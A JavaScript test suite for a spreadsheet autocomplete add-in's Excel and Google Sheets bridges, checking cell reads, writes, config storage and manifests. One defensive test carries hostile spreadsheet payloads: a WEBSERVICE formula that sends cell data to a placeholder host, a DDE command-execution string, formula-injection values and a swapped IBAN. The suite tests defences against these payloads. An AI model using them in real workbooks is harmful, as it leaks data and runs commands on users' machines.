// The two host bridges and the sidebar page, driven headlessly: taskpane.js
// against a fake Excel workbook behind Office.js, apps-script/Code.gs against
// fake SpreadsheetApp and PropertiesService, the inline script of
// Sidebar.html against a deferred google.script.run; plus the manifest and
// the pages as text. The real hosts were not run here (README.md).
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const sheets = require("../../core/sheets.js");
const { SAMPLE_SECTION } = require("../../desktop/apps/sheets/sample.js");
// The add-in cannot load the desk's name table and repeats the name; the menu, sidebar and manifest checks hold it to the table.
const NAME = require("../../desktop/apps/index.js").NAMES.sheets.name;
const { Node, fakeDocument, sandboxed, plain, storageOf, fakeExcel, fakeAppsScript, fakeGoogleRun } = require("./fakes.js");

const ADDIN = path.join(__dirname, "..");
const CONFIG = JSON.stringify(sheets.exportConfig(SAMPLE_SECTION));
const ORDERS = [
  ["Order", "Customer", "Amount", "Delivery notes"],
  ["A-1", "ACME", "100", "Customer called about the late delivery."],
  ["A-2", "Zed Transport", "250", ""],
  ["A-3", "acm", "", "Driver was late. Prom"],
  ["A-4", "Zed Transport", "80", "Customer called about the late delivery. Promised a call back."],
  ["A-5", "Birch & Co", "", "Parcel left at the side entrance. Promised a call back."],
];

function excelPane(spec) {
  const host = fakeExcel(spec);
  const root = new Node("div");
  const globals = { Excel: host.Excel, Office: host.Office, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  vm.runInContext(fs.readFileSync(path.join(ADDIN, "taskpane.js"), "utf8"), sandbox, { filename: "taskpane.js" });
  return { host, root, bridge: sandbox.ActleSheetsExcel, sandbox };
}

test("the Excel bridge reads the active cell's text, its header and the column's displayed values without the cell itself", async () => {
  const { host, bridge } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" } });
  assert.deepEqual(plain(await bridge.readContext()), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport", "Zed Transport", "Birch & Co"], rows: [2, 3, 5, 6], clipped: false });
  assert.equal(host.state.syncs, 2, "two round trips: the selection, then the header and the column");
  await host.select("Orders 2026", "D2");
  assert.deepEqual(plain(await bridge.readContext()).values, ["", "Driver was late. Prom", "Customer called about the late delivery. Promised a call back.", "Parcel left at the side entrance. Promised a call back."], "rows after the cell are kept, the cell's own row is left out");
  assert.deepEqual(plain(await bridge.readContext()).rows, [3, 4, 5, 6], "each value's row, for a column check");
  const lower = [[], [], [], [], ["Code", "x"], ["CC-100", "y"], ["CC-200", "z"]];
  const used = excelPane({ sheets: { Codes: lower }, active: { sheet: "Codes", address: "A6" } });
  assert.deepEqual(plain(await used.bridge.readContext()), { sheet: "Codes", address: "A6", text: "CC-100", header: "", values: ["Code", "CC-200"], rows: [5, 7], clipped: false }, "a used range that starts below row 1 is read from its first row; row 1 is still the header");
  const headerOnly = excelPane({ sheets: { Empty: [["Customer", "Amount"]] }, active: { sheet: "Empty", address: "A2" } });
  assert.deepEqual(plain(await headerOnly.bridge.readContext()), { sheet: "Empty", address: "A2", text: "", header: "Customer", values: [], rows: [], clipped: false });
  const blank = excelPane({ sheets: { Blank: [[]] }, active: { sheet: "Blank", address: "C3" } });
  assert.deepEqual(plain(await blank.bridge.readContext()), { sheet: "Blank", address: "C3", text: "", header: "", values: [], rows: [], clipped: false });
  const long = [["Customer"]].concat(Array.from({ length: bridge.MAX_ROWS + 2 }, (_, i) => ["Row " + (i + 2)]));
  const big = excelPane({ sheets: { Big: long }, active: { sheet: "Big", address: "A2" } });
  const clipped = plain(await big.bridge.readContext());
  assert.equal(clipped.clipped, true);
  assert.equal(clipped.values.length, bridge.MAX_ROWS - 1, "the first MAX_ROWS rows, minus the selected one");
  assert.equal(clipped.values[0], "Row 3");
  assert.deepEqual([clipped.rows.length, clipped.rows[0], clipped.rows[clipped.rows.length - 1]], [bridge.MAX_ROWS - 1, 3, bridge.MAX_ROWS + 1]);
});

test("the Excel bridge writes a completion as text, a block as a rectangle with text cells as text, and a formula as a formula", async () => {
  const { host, bridge } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" } });
  await bridge.writeValue({ sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH");
  assert.deepEqual(host.calls.splice(0), [["numberFormat", "'Orders 2026'!B4", [["@"]]], ["values", "'Orders 2026'!B4", [["Acme Logistics GmbH"]]]], "the text format is set before the value");
  assert.equal(host.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  await bridge.writeValue({ sheet: "Orders 2026", address: "C4" }, 21.5);
  assert.deepEqual(host.calls.splice(0), [["numberFormat", "'Orders 2026'!C4", [["@"]]], ["values", "'Orders 2026'!C4", [["21.5"]]]], "always a string");
  await bridge.writeRows({ sheet: "Orders 2026", address: "A8" }, [["Date", "Amount", "Cost centre"], ["", 0, true]]);
  assert.deepEqual(host.calls.splice(0), [
    ["numberFormat", "'Orders 2026'!A8:C9", [["@", "@", "@"], ["@", "General", "General"]]],
    ["values", "'Orders 2026'!A8:C9", [["Date", "Amount", "Cost centre"], ["", 0, true]]],
  ]);
  assert.deepEqual(host.grids["Orders 2026"][8], ["", 0, true]);
  await bridge.writeFormula({ sheet: "Orders 2026", address: "C7" }, "=ROUND(B2*0.19, 2)");
  assert.deepEqual(host.calls.pop(), ["formulas", "'Orders 2026'!C7", [["=ROUND(B2*0.19, 2)"]]]);
  await assert.rejects(bridge.writeValue({ sheet: "Gone", address: "A1" }, "x"), /worksheet Gone not found/);
});

test("the Excel bridge keeps the configuration in the document settings and reports a save that failed", async () => {
  const { host, bridge } = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" } });
  assert.equal(await bridge.loadConfig(), "");
  await bridge.saveConfig(CONFIG);
  assert.equal(host.settings.get(bridge.SETTING), CONFIG);
  assert.deepEqual(host.calls, [["saveAsync"]]);
  assert.equal(await bridge.loadConfig(), CONFIG);
  await bridge.saveConfig(undefined);
  assert.equal(await bridge.loadConfig(), "", "nothing stays nothing");
  const failing = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" }, failSave: "the workbook is read-only" });
  await assert.rejects(failing.bridge.saveConfig(CONFIG), /the workbook is read-only/);
  const fired = [];
  bridge.onSelectionChanged(() => fired.push("changed"));
  assert.deepEqual(host.handlers.map(([type]) => type), ["documentSelectionChanged"]);
  await host.select("S", "A1");
  assert.deepEqual(fired, ["changed"]);
});

test("Office.onReady builds the pane in Excel and says so elsewhere; the pane then follows the selection", async () => {
  const { host, root, bridge, sandbox } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" }, settings: { actleSheetsConfig: CONFIG } });
  assert.equal(host.Office.ready, bridge.start, "start is registered with Office.onReady");
  assert.equal(bridge.start({ host: "Word" }), null);
  assert.equal(root.textContent, "extle runs in Excel. Open this pane from an Excel workbook.");
  const pane = bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "the workbook's configuration is offered, not applied");
  await pane.ui.origin.button("Use the document's configuration").click();
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.equal(pane.ui.summary.textContent, "This document's configuration, in use instead of the text above: 2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"]);
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(host.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  await host.select("Orders 2026", "D4");
  assert.equal(pane.ui.input.value, "Driver was late. Prom");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Promised a call back."]);
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "the document had the configuration; using it never copies it into the browser");
});

test("a task pane that cannot start says so under the extle name", async () => {
  const { host, root, bridge } = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" } });
  // A stand-in for any error out of the pane's start(): the throw reaches the bridge's .catch. It is not how
  // Office.js reports a failed registration: that goes to an optional AsyncResult callback, which taskpane.js does not pass.
  host.Office.context.document.addHandlerAsync = () => { throw new Error("no selection events"); };
  bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(root.textContent, "extle could not start: no selection events");
});

test("a workbook whose settings carry another configuration cannot replace the organisation's, write its rows or formula unseen, or reach the browser copy", async () => {
  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
  const carried = JSON.stringify({
    vocabularies: { customers: ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00"] },
    columns: [{ match: { header: "customer" }, vocabulary: "customers" }],
    blocks: [{ trigger: "/total", label: "Totals row", formula }, { trigger: "/sig", label: "Signature block", rows: [["=HYPERLINK(\"https://example.invalid/\",\"Approved\")", "+1+1"], ["-cmd|' /C calc'!A0", "@SUM(A1:A2)"]] }, { trigger: "/pad", label: "Padding", rows: [["", ""], ["", ""]] }],
  });
  const sheet = ORDERS.concat([["/total", "", "", ""], ["/sig", "", "", ""], ["/pad", "keep me", "", ""]]);
  const { host, root, bridge, sandbox } = excelPane({ sheets: { "Orders 2026": sheet }, active: { sheet: "Orders 2026", address: "B4" }, settings: { actleSheetsConfig: carried } });
  sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
  const pane = bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"], "the organisation's vocabulary, not the workbook's");
  assert.match(pane.ui.origin.textContent, /^This document carries its own extle configuration in its settings\..*would add block "\/total" \(formula =WEBSERVICE\(.*remove block "\/vat"\./s, "the formula block is listed first, the triggers quoted");
  assert.doesNotMatch(pane.ui.origin.textContent, /\/sig/, "the formula-like rows block was dropped when the configuration was read");
  for (const address of ["A7", "A8", "A9"]) {
    await host.select("Orders 2026", address);
    assert.equal(root.find((n) => n.className === "block").textContent, "", address + ": no Insert button from the workbook's configuration");
  }
  await pane.ui.origin.button("Use the document's configuration").click();
  await host.select("Orders 2026", "A7");
  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "Insert alone writes nothing");
  assert.equal(pane.ui.block.find((n) => n.className === "formula").textContent, formula);
  await host.select("Orders 2026", "A8");
  assert.equal(pane.ui.block.textContent, "", "still no rows block");
  await host.select("Orders 2026", "A9");
  await pane.ui.block.button("Insert Padding (2 rows x 2 columns)").click();
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "rows from the workbook's configuration: Insert alone writes nothing either");
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into A9:B10, replacing what those 4 cells hold now?");
  assert.equal(host.grids["Orders 2026"][8][1], "keep me");
  await pane.ui.block.button("Write the rows").click();
  assert.deepEqual(host.calls.splice(0).filter(([what]) => what === "values"), [["values", "'Orders 2026'!A9:B10", [["", ""], ["", ""]]]], "the range the question named is the one Office.js writes");
  await pane.ui.save.click();
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), CONFIG, "Save keeps the organisation's copy in the browser");
  assert.equal(host.settings.get(bridge.SETTING), CONFIG, "and puts it in the workbook in place of the carried one");
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false);
});

function appsScript(spec) {
  const fake = fakeAppsScript(spec);
  const context = vm.createContext(Object.assign({}, fake.globals));
  vm.runInContext(fs.readFileSync(path.join(ADDIN, "apps-script", "Code.gs"), "utf8"), context, { filename: "Code.gs" });
  return { fake, gs: context };
}

test("Code.gs reads the selection as displayed text without the cell itself, within the row limit", () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 } });
  assert.deepEqual(plain(gs.getActiveCellContext(5000)), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport", "Zed Transport", "Birch & Co"], rows: [2, 3, 5, 6], clipped: false });
  assert.deepEqual(plain(gs.getActiveCellContext(2)), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport"], rows: [2, 3], clipped: true }, "the first rows only, marked clipped");
  assert.deepEqual(plain(gs.getActiveCellContext(3)).values, ["ACME", "Zed Transport"], "the selected row inside the limit is still left out");
  assert.deepEqual(plain(gs.getActiveCellContext(3)).rows, [2, 3]);
  fake.select("Orders 2026", 2, 4);
  assert.deepEqual(plain(gs.getActiveCellContext("nope")).values, ["", "Driver was late. Prom", "Customer called about the late delivery. Promised a call back.", "Parcel left at the side entrance. Promised a call back."], "an odd limit means the default");
  assert.deepEqual(plain(gs.getActiveCellContext(1e9)).values.length, 4, "capped, not the whole sheet");
  const { gs: empty } = appsScript({ sheets: { Empty: [["Customer"]] }, active: { sheet: "Empty", row: 2, col: 1 } });
  assert.deepEqual(plain(empty.getActiveCellContext(5000)), { sheet: "Empty", address: "A2", text: "", header: "Customer", values: [], rows: [], clipped: false });
});

test("Code.gs writes a completion as text, a block as a rectangle and a formula, and names a sheet that is gone", () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 } });
  gs.writeValue({ sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH");
  assert.deepEqual(fake.calls.splice(0), [["setNumberFormat", "B4", "@"], ["setValue", "B4", "Acme Logistics GmbH"]], "the text format is set before the value");
  assert.equal(fake.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  gs.writeValue({ sheet: "Orders 2026", address: "C4" }, 21.5);
  assert.deepEqual(fake.calls.splice(0), [["setNumberFormat", "C4", "@"], ["setValue", "C4", "21.5"]], "always a string");
  gs.writeRows({ sheet: "Orders 2026", address: "A8" }, [["Date", "Amount", "Cost centre"], ["", 0, true]]);
  assert.deepEqual(fake.calls.splice(0), [
    ["setNumberFormats", "A8:C9", [["@", "@", "@"], ["@", "General", "General"]]],
    ["setValues", "A8:C9", [["Date", "Amount", "Cost centre"], ["", 0, true]]],
  ]);
  gs.writeFormula({ sheet: "Orders 2026", address: "C7" }, "=ROUND(B2*0.19, 2)");
  assert.deepEqual(fake.calls.pop(), ["setFormula", "C7", "=ROUND(B2*0.19, 2)"]);
  assert.throws(() => gs.writeValue({ sheet: "Gone", address: "A1" }, "x"), /sheet Gone is gone/);
});

test("Code.gs keeps the configuration in document properties cut by UTF-8 bytes, shrinks cleanly, and leaves nothing half-written", () => {
  const { fake, gs } = appsScript({ sheets: {}, active: {} });
  assert.equal(gs.loadConfig(), "");
  const cyrillic = JSON.stringify({ vocabularies: { клиенты: { values: Array.from({ length: 1200 }, (_, i) => "Клиент номер " + i) } } });
  assert.ok(cyrillic.length > 8000 && Buffer.byteLength(cyrillic) > 3 * 9216, "longer than one property in either unit");
  gs.saveConfig(cyrillic);
  assert.equal(gs.loadConfig(), cyrillic);
  const chunks = [...fake.props.keys()].filter((key) => /\.\d+$/.test(key));
  assert.equal(fake.props.get("actleSheetsConfig.count"), String(chunks.length));
  for (const key of chunks) assert.ok(Buffer.byteLength(fake.props.get(key)) <= gs.CHUNK_BYTES, key + " fits a property");
  assert.ok(chunks.length >= Math.ceil(Buffer.byteLength(cyrillic) / gs.CHUNK_BYTES));
  assert.equal(fake.calls[0][1], "actleSheetsConfig.count", "the count is reset first");
  assert.equal(fake.calls[0][2], 1);
  assert.deepEqual(fake.calls[fake.calls.length - 1].slice(0, 2), ["setProperty", "actleSheetsConfig.count"], "and set last");
  fake.calls.length = 0;
  gs.saveConfig(CONFIG);
  assert.equal(gs.loadConfig(), CONFIG);
  assert.deepEqual([...fake.props.keys()].sort(), ["actleSheetsConfig.0", "actleSheetsConfig.count"], "stale chunks are deleted");
  assert.equal(fake.calls.filter(([what]) => what === "deleteProperty").length, chunks.length - 1);
  gs.saveConfig("");
  assert.equal(gs.loadConfig(), "");
  assert.equal(fake.props.get("actleSheetsConfig.count"), "0");
  const emoji = "x".repeat(8191) + "😀" + "y".repeat(10);
  assert.deepEqual(plain(gs.chunkByBytes(emoji, 8192)), ["x".repeat(8191), "😀" + "y".repeat(10)], "a surrogate pair is never split");
  assert.deepEqual(plain(gs.chunkByBytes("ab", 1)), ["a", "b"]);
  assert.deepEqual(plain(gs.chunkByBytes("€€", 3)), ["€", "€"]);
  assert.deepEqual(plain(gs.chunkByBytes("😀", 1)), ["😀"], "a pair wider than the limit stays whole");
  assert.equal(gs.chunkByBytes(cyrillic, 100).join(""), cyrillic);
  const halfway = appsScript({ sheets: {}, active: {}, properties: { "actleSheetsConfig.count": "2", "actleSheetsConfig.0": "{\"old\":", "actleSheetsConfig.1": "1}" }, failAt: 3 });
  assert.equal(halfway.gs.loadConfig(), "{\"old\":1}");
  assert.throws(() => halfway.gs.saveConfig(cyrillic), /property write failed/);
  assert.equal(halfway.gs.loadConfig(), "", "no mix of old and new chunks: nothing, so the sidebar uses the browser's copy");
  const missing = appsScript({ sheets: {}, active: {}, properties: { "actleSheetsConfig.count": "2", "actleSheetsConfig.0": "{" } });
  assert.equal(missing.gs.loadConfig(), "", "a missing chunk is not glued to the others");
});

test("Code.gs adds the menu, opens the sidebar and serves the includes", () => {
  const { fake, gs } = appsScript({ sheets: {}, active: {} });
  gs.onOpen();
  assert.equal(fake.ui.menus[0].title, NAME);
  assert.deepEqual(fake.ui.menus[0].items, [["Open sidebar", "showSidebar"]]);
  gs.showSidebar();
  assert.deepEqual(fake.ui.sidebars, [{ file: "Sidebar", title: NAME }]);
  assert.equal(gs.include("sheets-core"), "<!-- include sheets-core -->");
});

test("the sidebar page talks to Code.gs through google.script.run, asks for 5000 rows, and skips a poll while one is pending", async () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 }, properties: {} });
  gs.saveConfig(CONFIG);
  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, writeValue: gs.writeValue, writeRows: gs.writeRows, writeFormula: gs.writeFormula, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig }, { deferred: true });
  const root = new Node("div");
  const ticks = [];
  // No copy in this browser: what loadConfig returns reaches the pane only as the offer below.
  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: (fn, ms) => ticks.push({ fn, ms }) };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
  const settle = () => new Promise((resolve) => setImmediate(resolve));
  await settle();
  assert.deepEqual(server.calls.splice(0), [["loadConfig"]]);
  server.flush();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]]);
  server.flush();
  await settle();
  const pane = root.find((n) => n.className === "context");
  const origin = root.find((n) => n.className === "origin");
  assert.equal(origin.textContent,
    "This document carries its own extle configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration. This browser has none yet: paste the file the actle desktop app exports under Settings."
    + "Using the document's would add block \"/vat\" (formula =ROUND(B2*0.19, 2)); add vocabulary \"customers\" (4 values); add vocabulary \"costCentres\" (3 values); replace the column rules (3 instead of 0); add block \"/exp\" (2 rows x 3 columns)."
    + "Use the document's configuration" + "Not now", "the spreadsheet's configuration, as Code.gs's loadConfig returned it through google.script.run, is offered");
  assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "and not applied before the person chooses it");
  await origin.button("Use the document's configuration").click();
  assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.deepEqual(ticks.map((t) => t.ms), [2000]);
  ticks[0].fn();
  ticks[0].fn();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]], "the second tick is skipped while the first is on its way");
  server.flush();
  await settle();
  ticks[0].fn();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]], "and runs again once it answered");
  server.flush();
  await settle();
  const clicked = root.all((n) => n.className === "completion")[0].click(); // the write waits for the server's answer
  server.flush();
  await clicked;
  assert.deepEqual(server.calls.splice(0), [["writeValue", { sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH"]]);
  assert.equal(fake.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  assert.equal(root.find((n) => n.className === "message").textContent, 'Wrote "Acme Logistics GmbH" to B4.');
  fake.select("Gone", 1, 1); // no such sheet: the server function throws
  ticks[0].fn();
  await settle();
  server.flush();
  await settle();
  assert.match(root.find((n) => n.className === "message").textContent, /^Cannot read the selection: /, "a failure handler becomes an Error with its message");
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "using the spreadsheet's configuration never copies it into the browser");
});

test("a sidebar that cannot start says so under the extle name", async () => {
  const { gs } = appsScript({ sheets: { S: [["a"]] }, active: { sheet: "S", row: 1, col: 1 }, properties: {} });
  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig });
  const root = new Node("div");
  // A stand-in for any error out of the pane's start(): the throw reaches the page's .catch. A browser's setInterval does not throw.
  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: () => { throw new Error("no timers"); } };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(root.textContent, "extle could not start: no timers");
});

/** Open and close tags must nest; comments, the prolog and self-closing tags are skipped. */
function xmlBalanced(xml) {
  const stack = [];
  for (const match of xml.replace(/<!--[\s\S]*?-->/g, "").matchAll(/<(\/?)([A-Za-z:][\w:.-]*)[^>]*?(\/?)>/g)) {
    if (match[3]) continue;
    if (match[1]) {
      if (stack.pop() !== match[2]) return false;
    } else stack.push(match[2]);
  }
  return stack.length === 0;
}

test("the Office manifest, the pages and the Apps Script files are consistent with the build", () => {
  const manifest = fs.readFileSync(path.join(ADDIN, "manifest.xml"), "utf8");
  assert.equal(xmlBalanced(manifest), true);
  assert.equal(xmlBalanced("<a><b></a>"), false);
  assert.match(manifest, /<Id>7b1f6c9a-0000-4000-8000-000000000001<\/Id>/);
  assert.match(manifest, /<SourceLocation DefaultValue="https:\/\/localhost:3000\/taskpane.html"\/>/);
  assert.match(manifest, /<Set Name="ExcelApi" MinVersion="1.7"\/>/);
  assert.equal([...manifest.matchAll(/https:\/\/(?!localhost:3000)/g)].length, 0, "every URL is the documented placeholder");
  assert.match(manifest, /placeholder GUID/);
  const page = fs.readFileSync(path.join(ADDIN, "taskpane.html"), "utf8");
  for (const src of ["https://appsforoffice.microsoft.com/lib/1/hosted/office.js", "dist/sheets-core.js", "pane.js", "taskpane.js"]) assert.ok(page.includes('src="' + src + '"'), src);
  assert.equal([...page.matchAll(/src="https?:/g)].length, 1, "Office.js is the one external script");
  assert.equal(/\son\w+="/.test(page), false, "no inline handlers");
  const sidebar = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  assert.ok(sidebar.includes('<?!= include("sheets-core"); ?>') && sidebar.includes('<?!= include("pane"); ?>'));
  const ignored = fs.readFileSync(path.join(ADDIN, ".gitignore"), "utf8");
  for (const line of ["dist/", "apps-script/sheets-core.html", "apps-script/pane.html"]) assert.ok(ignored.split("\n").includes(line), line + " is not committed");
  const appsscript = JSON.parse(fs.readFileSync(path.join(ADDIN, "apps-script", "appsscript.json"), "utf8"));
  assert.equal(appsscript.runtimeVersion, "V8");
  assert.deepEqual(appsscript.oauthScopes, ["https://www.googleapis.com/auth/spreadsheets.currentonly", "https://www.googleapis.com/auth/script.container.ui"], "the current spreadsheet only");
});

test("the manifest and the task pane page name the add-in extle; the Description and LongStrings stay within their documented lengths", () => {
  const manifest = fs.readFileSync(path.join(ADDIN, "manifest.xml"), "utf8");
  const attr = (pattern) => (manifest.match(pattern) || [])[1];
  assert.equal(attr(/<DisplayName DefaultValue="([^"]*)"\/>/), NAME);
  assert.ok(attr(/<Description DefaultValue="([^"]*)"\/>/).startsWith(NAME + ": "));
  assert.equal(attr(/<bt:String id="actle\.Group\.Label" DefaultValue="([^"]*)"\/>/), NAME, "the ribbon group");
  assert.equal(attr(/<bt:String id="actle\.OpenPane\.Label" DefaultValue="([^"]*)"\/>/), "Open " + NAME, "the button and its supertip title");
  assert.ok(attr(/<bt:String id="actle\.OpenPane\.Tip" DefaultValue="([^"]*)"\/>/).startsWith("Open the " + NAME + " pane: "));
  assert.match(manifest, /<ProviderName>actle<\/ProviderName>/, "the provider stays actle");
  // learn.microsoft.com/javascript/api/manifest: Description up to 250 characters, a LongStrings string up to 250.
  // The DisplayName and the ShortStrings are pinned exactly to NAMES.sheets.name ("extle", pinned in
  // test/apps-registry.test.js), so their 125-character limits need no check of their own.
  assert.ok(attr(/<Description DefaultValue="([^"]*)"\/>/).length <= 250);
  const strings = (block) => [...(manifest.match(new RegExp("<bt:" + block + ">([\\s\\S]*?)</bt:" + block + ">")) || ["", ""])[1].matchAll(/DefaultValue="([^"]*)"/g)].map((m) => m[1]);
  assert.deepEqual(strings("ShortStrings"), [NAME, "Open " + NAME]);
  assert.equal(strings("LongStrings").length, 1);
  assert.ok(strings("LongStrings").every((text) => text.length <= 250));
  const page = fs.readFileSync(path.join(ADDIN, "taskpane.html"), "utf8");
  assert.ok(page.includes("<title>" + NAME + "</title>"));
});

// A budget sheet whose cost centre column (C) is strict in the sample section; C4 holds what is being typed.
const BUDGET = [
  ["Date", "Amount", "Cost centre"],
  ["2026-10-01", "100", "CC-100 Logistics"],
  ["2026-10-02", "250", "sales"],
  ["2026-10-03", "80", "cc"],
  ["2026-10-04", "40", "cc-300  warehouse"],
  ["2026-10-05", "12", "CC-999 Old"],
];
const strictPanel = (root) => root.find((n) => n.className === "strict");

test("the Excel bridge replaces only cells that still hold what the check read, as text, and reports the others", async () => {
  const { host, bridge } = excelPane({ sheets: { Budget: BUDGET }, active: { sheet: "Budget", address: "C4" } });
  host.grids.Budget[4][2] = "CC-300 Warehouse"; // corrected by hand after the check
  const result = plain(await bridge.replaceValues({ sheet: "Budget", column: "C" }, [{ row: 3, from: "sales", to: "CC-200 Sales" }, { row: 5, from: "cc-300  warehouse", to: "CC-300 Warehouse" }]));
  assert.deepEqual(result, { written: [3], skipped: [{ row: 5, text: "CC-300 Warehouse" }], computed: [] });
  assert.deepEqual(host.state.loads.pop(), ["Budget!C3:C5", "text, formulas"], "one read of the rows involved, just before writing");
  assert.deepEqual(host.calls, [["numberFormat", "Budget!C3", [["@"]]], ["values", "Budget!C3", [["CC-200 Sales"]]]], "the text format first, then the list's spelling, in that cell only");
  assert.equal(host.grids.Budget[2][2], "CC-200 Sales");
});

// C3 shows "sales" from a formula, C5 is part of a dynamic array anchored in E5, C6 is protected.
const COMPUTED = BUDGET.concat([["2026-10-06", "9", "Sales"], ["2026-10-07", "5", "sales"]]);
const COMPUTED_CHANGES = [{ row: 3, from: "sales", to: "CC-200 Sales" }, { row: 5, from: "cc-300  warehouse", to: "CC-300 Warehouse" }, { row: 7, from: "Sales", to: "CC-200 Sales" }, { row: 8, from: "sales", to: "CC-200 Sales" }];

test("the Excel bridge never overwrites a formula or a spilled result, and a batch Excel stops at a protected cell reports what was written before it", async () => {
  const spec = { sheets: { Budget: COMPUTED }, active: { sheet: "Budget", address: "C4" }, formulas: { Budget: { C3: "=LOWER(B9)" } }, spills: { Budget: { C5: "Budget!E5" } } };
  const { host, bridge } = excelPane(spec);
  assert.deepEqual(plain(await bridge.replaceValues({ sheet: "Budget", column: "C" }, COMPUTED_CHANGES)), { written: [7, 8], skipped: [], computed: [3, 5] });
  assert.deepEqual(host.state.spillLookups, ["Budget!C3", "Budget!C5", "Budget!C7", "Budget!C8"], "each cell's spill parent is asked for where Excel has ExcelApi 1.12");
  assert.deepEqual(host.calls.map(([what, address]) => what + " " + address), ["numberFormat Budget!C7", "values Budget!C7", "numberFormat Budget!C8", "values Budget!C8"], "nothing is written into C3 or C5");
  assert.deepEqual(host.formulas.Budget.get("2,2"), "=LOWER(B9)", "C3 keeps its formula");
  const older = excelPane(Object.assign({}, spec, { apiSets: { ExcelApi: "1.11" } }));
  assert.deepEqual(plain(await older.bridge.replaceValues({ sheet: "Budget", column: "C" }, COMPUTED_CHANGES)), { written: [5, 7, 8], skipped: [], computed: [3] }, "without ExcelApi 1.12 a spilled cell is not told apart; a formula still is");
  assert.deepEqual(older.host.state.spillLookups, []);
  const locked = excelPane({ sheets: { Budget: COMPUTED }, active: { sheet: "Budget", address: "C4" }, protect: { Budget: ["C7"] } });
  assert.deepEqual(plain(await locked.bridge.replaceValues({ sheet: "Budget", column: "C" }, COMPUTED_CHANGES)), { written: [3, 5], skipped: [], computed: [], failed: { row: 7, message: "the cell Budget!C7 is protected" } }, "the cells before the stop come from the batch's trace messages");
